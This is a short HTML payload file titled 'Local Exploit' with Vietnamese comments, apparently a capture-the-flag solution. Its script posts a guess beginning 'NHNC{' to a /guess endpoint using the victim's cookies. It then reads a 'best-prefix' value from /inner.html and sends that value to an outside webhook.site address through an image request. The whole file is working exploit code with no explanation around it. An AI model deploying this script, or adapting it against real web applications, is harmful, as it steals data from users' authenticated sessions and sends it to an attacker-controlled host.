<!-- static/payload.html -->
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Local Exploit</title></head>
<body>
<script>
(async () => {
  // 1) POST /guess với một guess bất kỳ để set cookie 'best' 
  await fetch('/guess', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ guess: 'NHNC{', note: '' })
  });
  // 2) GET /inner.html để đọc best-prefix
  const html = await fetch('/inner.html', { credentials: 'include' }).then(r=>r.text());
  const prefix = html.match(/<span id="best-prefix">(.*?)<\/span>/)[1];
  // 3) Leak ra webhook
  new Image().src = 'https://webhook.site/YOUR-UUID?flag='+encodeURIComponent(prefix);
})();
</script>
</body>
</html>
